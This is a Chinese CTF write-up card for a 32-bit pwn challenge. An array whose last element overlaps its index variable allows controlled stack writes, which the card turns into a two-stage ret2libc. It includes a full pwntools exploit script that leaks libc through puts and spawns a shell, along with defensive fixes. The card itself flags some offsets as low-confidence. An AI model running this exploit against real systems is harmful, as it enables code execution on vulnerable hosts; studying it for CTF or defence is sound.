---
id: ctf-pwn-bill-array-index-loop-stack-word-write-ret2libc
title: 账单数组索引循环写栈：v2 与 v1[11] 重叠导致逐 32 位可控写，32 位 ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: bill-array-index-loop-stack-word-write-ret2libc
aliases:
- account
- 上海市大学生网络安全大赛
- 账单数组溢出
- 数组索引循环写
- v2 覆盖索引
- 32 位 ret2libc
- 栈字写入
tags:
- ctf
- pwn
- stack-overflow
- array-oob
- index-overlap
- ret2libc
- i386
- non-pie
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V243
  verified_at: '2026-11-07T13:18:42+08:00'
  notes: 已对照原文与14张图核对：v1[11] 与 v2 在 ebp-0x0C 重叠、v1[++v2]=v1[0] 循环、两阶段 32 位 ret2libc、target/main/puts_got 与 system/main/bin_sh 写槽顺序与 exp 一致；已按截图把 flag 修正为 flag{c1jOG9xfapSXmDNQ3WZVPMu7lyAqKCBg}。target_addr 语义原文未解释，卡已标 confidence low 并注明需按二进制确认。dup-scan 无同链候选。未验证点：未复跑；无 sources/版本。
---

## 一句话结论

`vul()` 用 `int v1[11]` 接收账单，并在每次输入后执行 `v1[++v2] = v1[0]`，只以输入 `0` 结束、完全不限制 `v2`；由于 `v1[11]` 正好与局部变量 `v2` 重叠，连续输入可以把 `v2` 改成更大的索引，之后每轮继续把用户输入的 32 位值写到 `v1[v2]`，从而越过数组写到保存的 ebp、返回地址与参数槽。原文利用非 PIE、地址固定的 32 位程序，先写 `target_addr/main_addr/puts_got` 泄 libc，再写 `system/main_addr/bin_sh` 完成 ret2libc，执行 `cat flag.txt` 取 flag。

## 原理

- **数组与索引变量重叠**：`v1[11]` 的地址是 `ebp-0x0C`，局部变量 `v2` 也在 `ebp-0x0C`；`v1[++v2] = v1[0]` 先自增 `v2`，再写入。当 `v2` 增长到 11 时，写入目标正好是 `v2` 自己，于是可以把 `v2` 改成任意值（受 `atoi` 范围和栈可写性限制），下一轮 `v1[++v2]` 就跳到任意栈偏移。
- **逐 32 位可控写**：每次循环只写一个 dword（`v1[0]` 的值），但可以连续多轮写不同值，相当于在栈上做“受控的字写入”。这比 `read` 大段溢出更隐蔽，但足以逐槽改写保存的 ebp、返回地址和 32 位 cdecl 参数槽。
- **32 位 cdecl 传参**：`system` 的第一个参数在栈上 `[esp+4]`，因此 ret2libc 需要在返回地址之后依次放 `system` 的返回地址（可填 `main_addr` 便于二次进入）与 `bin_sh` 指针；原文的“注意传参方式”即指此。
- **非 PIE + 固定地址**：程序代码段地址不随机，`target_addr`、`main_addr`、`puts@plt`、`puts@got` 都可硬编码；libc 基址通过 `puts(puts_got)` 泄露后计算。
- **两阶段**：第一阶段写 `target_addr/main_addr/puts_got`，让程序按改写后的栈返回并调用 `puts(puts_got)`（具体 `target_addr` 的语义原文未解释，需按二进制确认）；第二阶段写 `system/main_addr/bin_sh`，返回后执行 `system("/bin/sh")`。

## 触发条件

- 程序用固定大小数组 + 自增索引循环接收输入，结束条件只检查输入值（如 `if (!v1[0]) break`），不检查索引上界。
- 数组最后一个元素与索引变量/其他控制变量在栈上重叠，使攻击者能改写索引。
- 程序为非 PIE 或代码地址可预测，且存在可泄露 libc 的导入函数（如 `puts`）。
- 目标 libc 版本已知，能计算 `system` 与 `"/bin/sh"` 偏移。

## 利用步骤

1. 反编译 `vul()`，确认 `v1` 大小、`v2` 位置与循环写入公式 `v1[++v2] = v1[0]`，计算 `v1[11]` 是否与 `v2` 重叠。
2. 用 gdb 在循环后下断，观察 `v1` 起始地址、保存 ebp、返回地址与参数槽相对 `v1` 的索引；标出第一个阶段要覆盖的三个槽。
3. 按“10 次 `1` → `13` → target_addr → main_addr → puts_got → `0`”的方式把 `v2` 推过数组并写入三个目标槽，触发 `puts(puts_got)` 泄 libc。
4. 接收 4 字节泄漏，减去 `puts` 在目标 libc 中的偏移得到 `libc_base`；计算 `system` 与 `"/bin/sh"`。
5. 第二次进入 `vul()`，以同样方式写 `system → main_addr → bin_sh`，构造 32 位 ret2libc。
6. 进入交互后执行 `cat flag.txt`（原文在 remote 上得到 `flag{c1jOG9xfapSXmDNQ3WZVPMu7lyAqKCBg}`）。

## PoC

```python
from pwn import *
context(arch='i386', os='linux', log_level='debug')
p = remote('TARGET', PORT)
elf = ELF('./account')
libc = ELF('./libc.so.6')

p.recvuntil(b"Enter your bill, enter 0 to exit:\n")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x80492EB        # 原文 main 地址，按二进制确认
target_addr = 0x80490B0      # 原文用于调整返回链的地址/跳板，需按二进制确认

# 阶段 1：把 v2 推过数组，写 target/main/puts_got，返回后 puts(puts_got)
for _ in range(10):
    p.sendline(b'1')
p.sendline(b'13')
p.sendline(str(target_addr).encode())
p.sendline(str(main_addr).encode())
p.sendline(str(puts_got).encode())
p.sendline(b'0')
p.recvuntil(b"Recording completed\n")
libc.address = u32(p.recv(4)) - 0x6d1e0     # puts 偏移按目标 libc 调整

# 阶段 2：写 system/main/bin_sh，ret2libc
p.recvuntil(b"Enter your bill, enter 0 to exit:\n")
for _ in range(10):
    p.sendline(b'1')
p.sendline(b'13')
p.sendline(str(libc.sym['system']).encode())
p.sendline(str(main_addr).encode())
p.sendline(str(next(libc.search(b'/bin/sh\x00'))).encode())
p.sendline(b'0')
p.interactive()
```

说明：原文的 `target_addr`/`main_addr` 具体角色未在文中解释，脚本按原值复现；实际偏移、槽位顺序与 libc 偏移需用 gdb 和目标 libc 校准。该卡因原文细节不足标 `confidence: low`。

## 变体与关联

- 变体：索引变量放在数组之前/之后、或与数组某元素重叠，都可以用“先改写索引、再继续写”扩大写入范围。
- 变体：若写入是按字节/半字，可做更精细的栈布局；若循环上限固定（如 10 次），需一次写多个槽或分阶段进入函数。
- 变体：无 `puts` 泄露时可改用 `write`/`printf`/格式化字符串；无 `system` 时可走 ORW/ROP。
- 关联：[[binary-pwn-stack-sparse-word-write-struct-field-rewrite-ret2libc]]（稀疏字写栈+两阶段 ret2libc）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（32 位两阶段 ret2libc）、[[ctf-pwn-int-array-oob-index-ret-overwrite]]（整数数组越界写返回地址）。
- 边界：若编译器把 `v2` 放到寄存器或数组与 `v2` 之间插入 padding，重叠不成立；若栈有 canary，需先泄露/绕过。

## 检测与防御

- 检测（逆向侧）：`scanf("%d", arr)` + `arr[++idx] = arr[0]` 的循环、只检查输入值不检查 idx、数组末尾与局部变量重叠，都是可写索引溢出的强特征。
- 修复：索引使用无符号类型并检查 `idx < sizeof(arr)/sizeof(arr[0])`；输入长度与循环次数做上限；把数组与索引变量分开布局，避免重叠。
- 加固：开启 PIE/Canary/NX/Full RELRO；对关键输入函数做边界测试；避免用用户输入作为数组索引。
